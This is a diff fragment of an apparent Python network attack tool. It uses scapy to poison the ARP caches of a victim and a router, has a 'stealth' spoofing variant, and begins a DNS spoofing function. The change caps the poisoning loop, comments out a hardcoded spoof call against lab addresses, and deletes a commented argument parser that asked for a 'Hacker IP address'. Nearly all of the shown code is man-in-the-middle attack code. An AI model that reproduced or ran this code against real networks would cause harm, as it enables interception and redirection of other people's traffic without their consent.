@@ -99,10 +99,10 @@ def arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac):
     scapy.all.send(scapy.all.ARP(op=1, hwsrc=attacker_mac, psrc=router_ip, hwdst=victim_mac, pdst=victim_ip))
 
 
-def arp_poison(victim_ip, victim_mac, router_ip, router_mac):
+def arp_poison(victim_ip, victim_mac, router_ip, router_mac, iterations= 100):
     print("Spoofing network...")
     try:
-        while 1:
+        for i in range(iterations):
             arp_spoof(victim_ip, victim_mac, router_ip, router_mac)
             time.sleep(2)
     except KeyboardInterrupt:
@@ -111,18 +111,8 @@ def arp_poison(victim_ip, victim_mac, router_ip, router_mac):
 
 
 def arp_poison_stealthy(victim_ip, victim_mac, router_ip, router_mac):
-    arp_spoof('192.168.56.101', '0:0:0:0:0:0', '192.168.56.1', '0a:00:27:00:00:13')
+    # arp_spoof('192.168.56.101', '0:0:0:0:0:0', '192.168.56.1', '0a:00:27:00:00:13')
     arp_spoof_stealth(victim_ip, victim_mac, router_ip, router_mac)
-
-
-# def get_arguments():
-#     parser = argparse.ArgumentParser()
-#     parser.add_argument("-w", "--website", dest="website",
-#                         help="Website url")
-#     parser.add_argument("-i", "--ip-address", dest="ip",
-#                         help="Hacker IP address")
-#     options = parser.parse_args()
-#     return options
 
 
 def dns_spoofing(interface, website, ip, spoof_all):
